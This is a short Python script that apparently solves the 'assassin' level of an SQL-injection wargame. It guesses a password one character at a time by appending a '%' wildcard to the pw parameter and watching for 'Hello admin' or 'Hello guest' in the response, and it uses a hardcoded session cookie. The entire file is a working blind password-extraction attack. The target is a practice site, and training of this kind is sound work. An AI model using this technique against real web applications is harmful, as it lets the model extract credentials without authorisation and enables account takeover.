import requests
import string

a = string.printable
a=a[:-38]
pw=''
pw_=''
for i in range(8) :
    for j in a:
        pw_=pw
        pw_+=str(j)
        URL='https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='+str(pw_)+'%'
        cookies = {'PHPSESSID': 'uo4qgalh2dduriqkrl7kvg5a8g'}
        res=requests.get(URL,cookies=cookies)
        print(pw_)
        if("Hello admin" in res.text or "Hello guest" in res.text):
            pw=pw+str(j)
            print('find!')
            break
